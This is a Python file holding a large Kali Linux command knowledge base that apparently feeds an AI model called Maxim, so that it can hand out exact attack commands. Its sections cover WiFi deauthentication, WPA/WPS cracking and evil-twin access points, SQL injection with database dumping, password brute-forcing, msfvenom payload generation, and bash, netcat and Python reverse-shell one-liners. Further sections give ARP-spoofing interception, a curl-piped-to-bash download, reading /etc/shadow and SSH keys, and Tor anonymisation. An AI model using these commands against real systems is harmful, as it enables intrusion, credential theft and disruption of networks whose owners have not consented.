"""
Maxim Command Knowledge Base — exact, tested commands for Kali Linux.
The AI uses this as reference to give precise commands instead of guessing.
"""

COMMAND_KB = """
=== NETWORK SCANNING ===
Scan target (full): nmap -sV -sC -O -A {target}
Quick scan: nmap -T4 -F {target}
Scan all ports: nmap -p- {target}
Scan UDP ports: sudo nmap -sU --top-ports 100 {target}
Scan subnet/discover hosts: sudo nmap -sn {subnet}
Aggressive scan: nmap -A -T4 {target}
Scan specific ports: nmap -p 80,443,8080 {target}
OS detection: sudo nmap -O {target}
Service version: nmap -sV {target}
Script scan: nmap --script=vuln {target}
Stealth scan: sudo nmap -sS -T2 {target}
Fast mass scan: sudo masscan -p1-65535 --rate=1000 {target}
ARP scan local network: sudo arp-scan -l
Netdiscover: sudo netdiscover -r {subnet}
Ping sweep: nmap -sn -PE {subnet}

=== WIFI / WIRELESS ===
List wireless interfaces: iwconfig
Check interface mode: iwconfig wlan0
Enable monitor mode: sudo airmon-ng check kill && sudo airmon-ng start wlan0
Disable monitor mode: sudo airmon-ng stop wlan0mon
Kill interfering processes: sudo airmon-ng check kill
Scan WiFi networks: sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo airodump-ng wlan0mon
Scan specific channel: sudo airodump-ng -c {channel} wlan0mon
Target specific AP: sudo airodump-ng -c {channel} --bssid {bssid} -w capture wlan0mon
Deauth attack: sudo aireplay-ng --deauth 0 -a {bssid} wlan0mon
Deauth specific client: sudo aireplay-ng --deauth 10 -a {bssid} -c {client_mac} wlan0mon
Crack WPA handshake: sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
Crack WPA with hashcat: hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
Convert cap to hashcat: hcxpcapngtool -o capture.hc22000 capture-01.cap
Auto WiFi attack: sudo wifite -i wlan0mon
WPS attack: sudo reaver -i wlan0mon -b {bssid} -vv
WPS scan: sudo wash -i wlan0mon
Change MAC: sudo macchanger -r wlan0
Restore MAC: sudo macchanger -p wlan0
Scan WiFi with bettercap: sudo bettercap -iface wlan0mon
Create evil twin: sudo airbase-ng -a {bssid} --essid "{ssid}" -c {channel} wlan0mon

=== WEB APPLICATION TESTING ===
Scan website: nikto -h {url}
Directory bruteforce: gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt
Directory with extensions: gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
FFUF fuzzing: ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirb/common.txt
Subdomain enum: ffuf -u http://FUZZ.{domain} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
SQL injection test: sqlmap -u "{url}?id=1" --batch --dbs
SQL injection POST: sqlmap -u "{url}" --data="user=admin&pass=test" --batch --dbs
SQL injection cookie: sqlmap -u "{url}" --cookie="PHPSESSID=abc123" --batch --dbs
Dump database: sqlmap -u "{url}?id=1" --batch -D {dbname} --dump
XSS scan: dalfox url "{url}?q=test"
WordPress scan: wpscan --url {url} --enumerate vp,vt,u
WordPress brute: wpscan --url {url} -U admin -P /usr/share/wordlists/rockyou.txt
CMS detection: whatweb {url}
SSL scan: sslscan {target}
Web tech detection: whatweb -a 3 {url}
WAF detection: wafw00f {url}

=== PASSWORD CRACKING ===
Crack hash with john: john --wordlist=/usr/share/wordlists/rockyou.txt {hashfile}
John show results: john --show {hashfile}
Hashcat MD5: hashcat -m 0 {hashfile} /usr/share/wordlists/rockyou.txt
Hashcat SHA256: hashcat -m 1400 {hashfile} /usr/share/wordlists/rockyou.txt
Hashcat NTLM: hashcat -m 1000 {hashfile} /usr/share/wordlists/rockyou.txt
Identify hash: hashid {hash}
Identify hash v2: hash-identifier
Hydra SSH brute: hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target}
Hydra FTP brute: hydra -l {user} -P /usr/share/wordlists/rockyou.txt ftp://{target}
Hydra HTTP POST: hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
Hydra RDP brute: hydra -l {user} -P /usr/share/wordlists/rockyou.txt rdp://{target}
Medusa SSH: medusa -h {target} -u {user} -P /usr/share/wordlists/rockyou.txt -M ssh
CrackMapExec SMB: crackmapexec smb {target} -u {user} -p /usr/share/wordlists/rockyou.txt

=== EXPLOITATION ===
Start Metasploit: msfconsole
Search exploits: searchsploit {query}
Copy exploit: searchsploit -m {exploit_id}
Generate reverse shell (Linux): msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf
Generate reverse shell (Windows): msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe
Generate PHP shell: msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -o shell.php
Netcat listener: nc -lvnp {lport}
Netcat reverse shell: nc -e /bin/bash {lhost} {lport}
Bash reverse shell: bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
Python reverse shell: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
Start handler: msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit"

=== ENUMERATION ===
SMB enum: enum4linux -a {target}
SMB shares: smbclient -L //{target} -N
SMB connect: smbclient //{target}/{share} -U {user}
SNMP walk: snmpwalk -v2c -c public {target}
DNS zone transfer: dig axfr {domain} @{target}
DNS enum: dnsenum {domain}
LDAP search: ldapsearch -x -H ldap://{target} -b "dc=domain,dc=com"
NFS shares: showmount -e {target}
RPC info: rpcclient -U "" -N {target}
Finger users: finger @{target}

=== SNIFFING / MITM ===
Capture packets: sudo tcpdump -i {iface} -w capture.pcap
Capture HTTP: sudo tcpdump -i {iface} -A port 80
ARP spoof: sudo arpspoof -i {iface} -t {target} {gateway}
Enable IP forwarding: sudo sysctl -w net.ipv4.ip_forward=1
Ettercap MITM: sudo ettercap -T -M arp:remote /{target}// /{gateway}//
Bettercap MITM: sudo bettercap -iface {iface} -eval "net.probe on; net.sniff on; arp.spoof on; set arp.spoof.targets {target}"
Responder: sudo responder -I {iface} -wrf
Wireshark: wireshark

=== POST EXPLOITATION ===
Upgrade shell: python3 -c 'import pty;pty.spawn("/bin/bash")'
LinPEAS: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
Find SUID: find / -perm -4000 -type f 2>/dev/null
Find writable dirs: find / -writable -type d 2>/dev/null
Capabilities: getcap -r / 2>/dev/null
Cron jobs: cat /etc/crontab; ls -la /etc/cron.*
SSH keys: find / -name authorized_keys -o -name id_rsa 2>/dev/null
Password files: cat /etc/passwd; cat /etc/shadow
Network connections: ss -tlnp; netstat -tlnp
Running processes: ps aux --sort=-%mem
System info: uname -a; cat /etc/os-release
Users: cat /etc/passwd | grep -v nologin

=== ANONYMITY ===
Start Tor: sudo service tor start
Check Tor: curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip
Proxychains: proxychains4 {command}
Change MAC: sudo macchanger -r {iface}

=== SYSTEM ADMIN ===
Create desktop icon: printf '[Desktop Entry]\\nType=Application\\nName={name}\\nExec={exec}\\nIcon={icon}\\nTerminal=false\\nCategories=Utility;' > ~/Desktop/{name}.desktop && chmod +x ~/Desktop/{name}.desktop
Install package: sudo apt-get install -y {package}
Update system: sudo apt-get update && sudo apt-get upgrade -y
Check IP: ip -c addr show
Check ports: ss -tlnp
Check processes: ps aux --sort=-%mem | head -20
Check disk: df -h
Check memory: free -h
Check routes: ip route show
Start service: sudo systemctl start {service}
Stop service: sudo systemctl stop {service}
Restart service: sudo systemctl restart {service}
Enable service: sudo systemctl enable {service}
Check firewall: sudo iptables -L -n
Add firewall rule: sudo iptables -A INPUT -p tcp --dport {port} -j ACCEPT
Kill process: kill -9 {pid}
Find files: find / -name "{filename}" 2>/dev/null
Check connections: ss -tulnp
Download file: wget {url} -O {output}
"""
